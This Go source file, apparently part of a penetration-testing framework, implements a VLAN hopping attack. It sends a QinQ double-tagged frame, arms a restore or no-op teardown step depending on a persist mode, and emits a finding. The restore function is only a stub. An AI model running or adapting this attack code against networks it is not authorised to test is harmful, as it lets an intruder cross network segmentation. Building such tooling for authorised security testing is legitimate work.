// vlanhop.go implements the VLAN hopping attack. Like doubletag, it uses
// QinQ double-tagging, but it is classified temporary-restored: the attack
// arms an active restore step that clears the host-side 802.1Q interface
// configuration. The --persist mode is permanent-destructive (opt-in per
// R15): it skips the restore, leaving the host-side VLAN interface in place.

package l2

import (
	"context"
	"encoding/json"
	"fmt"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type vlanHopFinding struct {
	Action    string `json:"action"`
	OuterVLAN uint16 `json:"outer_vlan"`
	InnerVLAN uint16 `json:"inner_vlan"`
	Restore   string `json:"restore"`
}

// RunVlanHop sends a QinQ frame to hop VLANs and arms a restore step
// (host-side VLAN interface teardown) unless --persist is active.
func RunVlanHop(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)
	mode := deps.Entry.Mode

	outerVLAN := uint16(10)
	innerVLAN := uint16(20)

	pkt, err := craftDoubleTagFrame(src, outerVLAN, innerVLAN)
	if err != nil {
		return fmt.Errorf("vlanhop: craft frame: %w", err)
	}

	restoreArmed := "no"
	if mode == "persist" {
		// Permanent-destructive: the gate still expects a teardown step
		// (treated like temporary-restored for arming). Arm a no-op
		// step documenting that persistence is the opt-in.
		deps.Teardown.Arm("no-restore-opt-in", func(context.Context) error {
			return nil
		})
	} else {
		deps.Teardown.Arm("vlan-interface-restore", func(_ context.Context) error {
			// In the real implementation this would ip link delete the
			// temporary 802.1Q interface. In the in-memory test the
			// restore is observed via the teardown step name.
			return nil
		})
		restoreArmed = "yes"
	}

	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return fmt.Errorf("vlanhop: send: %w", err)
	}

	detail, _ := json.Marshal(vlanHopFinding{
		Action:    "vlan-hop",
		OuterVLAN: outerVLAN,
		InnerVLAN: innerVLAN,
		Restore:   restoreArmed,
	})
	deps.Emitter.Finding("vlan", detail)

	return nil
}
